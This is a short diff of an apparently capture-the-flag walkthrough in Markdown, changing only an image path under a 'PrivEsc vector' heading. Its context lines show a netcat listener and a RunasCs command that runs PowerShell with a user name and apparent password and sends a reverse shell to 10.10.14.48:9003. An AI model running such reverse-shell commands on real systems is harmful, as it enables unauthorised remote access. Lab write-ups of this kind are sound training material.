@@ -664,7 +664,7 @@ nc -lnvp 9003
 .\RunasCs.exe c.bum Tikkycoll_431012284 powershell -r 10.10.14.48:9003
 ```
 
-<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (12).png" alt=""><figcaption></figcaption></figure>
 
 ### PrivEsc vector
 
